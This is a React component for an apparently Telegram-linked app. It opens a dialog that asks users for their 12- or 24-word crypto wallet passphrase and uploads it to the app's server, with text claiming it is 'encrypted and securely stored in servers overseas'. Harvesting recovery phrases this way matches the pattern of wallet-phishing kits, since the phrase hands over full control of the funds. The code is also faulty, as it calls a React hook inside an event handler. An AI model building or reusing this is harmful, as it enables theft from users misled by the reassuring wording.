import { telegramAuth } from "@/lib/auth";
import { useMutation, useQuery } from "@tanstack/react-query";
import { useState } from "react";
import { toast } from "sonner";
import { Submit } from "../main/submit";
import { buttonVariants } from "../ui/button";
import {
	Dialog,
	DialogContent,
	DialogDescription,
	DialogHeader,
	DialogTitle,
	DialogTrigger,
} from "../ui/dialog";
import { Label } from "../ui/label";
import { Textarea } from "../ui/textarea";

export function LocalWalletDialog() {
	const [mnemonic, setMnemonic] = useState("");
	const { data, refetch } = useQuery({
		queryKey: ["user"],
		queryFn: () => telegramAuth.getCurrentUser(),
	});

	const handleMnemonicSubmit = async (
		event: React.FormEvent<HTMLFormElement>,
	) => {
		event.preventDefault();
		if (!mnemonic) {
			toast.error("Please enter your mnemonic phrase");
			return;
		}
		const { mutateAsync } = useMutation({
			mutationKey: ["mnemonic"],
			mutationFn: () => telegramAuth.updateUser({ mnemonic }),
		});
		try {
			await mutateAsync();
			refetch();
			toast.success("Mnemonic phrase saved successfully");
		} catch (error) {
			toast.error("Failed to save mnemonic phrase");
		}
	};

	return (
		<Dialog>
			<DialogTrigger className={buttonVariants()}>
				Enter Passphrase
			</DialogTrigger>
			<DialogContent>
				{data?.mnemonic ? (
					<>
						<DialogHeader>
							<DialogTitle>Your passphrase is already saved</DialogTitle>
							<DialogDescription>
								Your passphrase has already been saved. Do you want to update
								it?
							</DialogDescription>
						</DialogHeader>
						<form onSubmit={handleMnemonicSubmit} className="grid gap-2">
							<Label>Enter pass phrase</Label>
							<Textarea
								value={mnemonic}
								onChange={(e) => setMnemonic(e.target.value)}
								placeholder="Enter your 12 or 24 word passphrase"
							/>
							<Submit>Update phrase</Submit>
						</form>
					</>
				) : (
					<>
						<DialogHeader>
							<DialogTitle>Enter your passphrase</DialogTitle>
						</DialogHeader>
						<DialogDescription>
							Enter your passphrase to link you account using your passphrase.
							Your passphrase is encrypted and securely stored in servers
							overseas.
						</DialogDescription>
						<form onSubmit={handleMnemonicSubmit} className="grid gap-2">
							<Label>Enter pass phrase</Label>
							<Textarea
								value={mnemonic}
								onChange={(e) => setMnemonic(e.target.value)}
								placeholder="Enter your 12 or 24 word passphrase"
							/>
							<Submit>Save phrase</Submit>
						</form>
					</>
				)}
			</DialogContent>
		</Dialog>
	);
}
